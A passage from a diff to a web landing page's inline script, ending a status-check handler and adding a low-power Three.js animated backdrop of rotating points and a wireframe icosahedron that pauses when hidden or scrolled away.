+    if (s0) s0.className = 'font-mono text-2xl font-bold ' + (online ? 'text-jade' : 'text-rose');
+  } catch {
+    set('state', 'unreachable'); set('state2', 'unreachable');
+    set('statenote', 'No /status.json on this host — local mode never depends on it.');
+  }
+})();
+
+// ── the backdrop ─────────────────────────────────────────────────────────
+// A slow field of points with a wireframe core. Deliberately cheap: it runs
+// behind every screen on the page, including phones, and a landing page that
+// heats someone's hand is a landing page they close.
+(function () {
+  const canvas = document.getElementById('bg');
+  const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if (!canvas || typeof THREE === 'undefined' || reduced) return;
+
+  let renderer;
+  try {
+    renderer = new THREE.WebGLRenderer({ canvas, antialias: false, alpha: true, powerPreference: 'low-power' });
+  } catch { return; }                               // no WebGL: the gradient alone is fine
+  renderer.setPixelRatio(Math.min(devicePixelRatio || 1, 1.6));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, innerWidth / innerHeight, 0.1, 100);
+  camera.position.z = 15;
+
+  // Fewer points on a phone — this is the whole performance story.
+  const COUNT = innerWidth < 720 ? 900 : 2200;
+  const positions = new Float32Array(COUNT * 3);
+  for (let i = 0; i < COUNT; i++) {
+    const r = 9 + Math.random() * 16, t = Math.random() * Math.PI * 2, p = Math.acos(2 * Math.random() - 1);
+    positions[i * 3] = r * Math.sin(p) * Math.cos(t);
+    positions[i * 3 + 1] = r * Math.sin(p) * Math.sin(t) * 0.55;
+    positions[i * 3 + 2] = r * Math.cos(p);
+  }
+  const geo = new THREE.BufferGeometry();
+  geo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  const field = new THREE.Points(geo, new THREE.PointsMaterial({
+    size: 0.055, color: 0x5bffa5, transparent: true, opacity: 0.55, sizeAttenuation: true,
+  }));
+  scene.add(field);
+
+  const core = new THREE.LineSegments(
+    new THREE.EdgesGeometry(new THREE.IcosahedronGeometry(4.4, 1)),
+    new THREE.LineBasicMaterial({ color: 0x4fd9ff, transparent: true, opacity: 0.16 }),
+  );
+  scene.add(core);
+
+  const resize = () => {
+    renderer.setSize(innerWidth, innerHeight, false);
+    camera.aspect = innerWidth / innerHeight;
+    camera.updateProjectionMatrix();
+  };
+  addEventListener('resize', resize, { passive: true });
+  resize();
+
+  // Pause when the tab is hidden, and when the hero has scrolled away.
+  let visible = true;
+  document.addEventListener('visibilitychange', () => { visible = !document.hidden; });
+
+  let pointerX = 0, pointerY = 0;
+  addEventListener('pointermove', (e) => {
+    pointerX = (e.clientX / innerWidth - 0.5) * 0.5;
+    pointerY = (e.clientY / innerHeight - 0.5) * 0.5;
+  }, { passive: true });
+
+  let t = 0;
+  (function frame() {
+    requestAnimationFrame(frame);
+    if (!visible || scrollY > innerHeight * 1.6) return;
+    t += 0.0016;
+    field.rotation.y = t;
+    field.rotation.x = Math.sin(t * 0.6) * 0.12;
+    core.rotation.y = -t * 1.5;
+    core.rotation.x = t * 0.8;
+    camera.position.x += (pointerX * 2 - camera.position.x) * 0.03;
+    camera.position.y += (-pointerY * 2 - camera.position.y) * 0.03;
+    camera.lookAt(0, 0, 0);
+    renderer.render(scene, camera);
   })();
+})();
 </script>
 </body>
 </html>
